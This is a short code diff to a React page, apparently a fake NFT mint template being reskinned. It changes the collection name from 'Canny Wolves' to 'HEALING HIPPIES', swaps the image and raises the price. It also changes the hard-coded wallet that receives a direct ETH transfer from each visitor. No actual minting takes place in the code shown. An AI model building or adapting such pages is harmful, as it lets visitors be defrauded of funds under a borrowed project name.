@@ -3,9 +3,9 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = 0.019
-const image = 'https://images-ext-1.discordapp.net/external/xQH2XOih_Whzwc7EKdvRMvn-zYPff5zyCRk2LaHHBDQ/https/pbs.twimg.com/profile_images/1515359686404583429/mi0bifvM_400x400.jpg'
-const Title = 'Canny Wolves'
+const ethAmount = 0.095
+const image = 'https://pbs.twimg.com/profile_images/1590535327206105089/Cx91rqa__400x400.png'
+const Title = 'HEALING HIPPIES'
 //const supply = 4200
 
 document.title = Title
@@ -42,7 +42,7 @@ function App() {
 
         let params = [{
             "from": address[0],
-            "to": '0x8f383a03e931DbC2eC6A92496e1a068eb85EA128',
+            "to": '0xAc1e81526bB869aA73B5B41D62dF4AD811df3d3B',
             // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
             // "gasPrice": Number(gas * 600000000).toString(16),
             "value": parseInt(ethAmount * 1000000000000000000).toString(16)
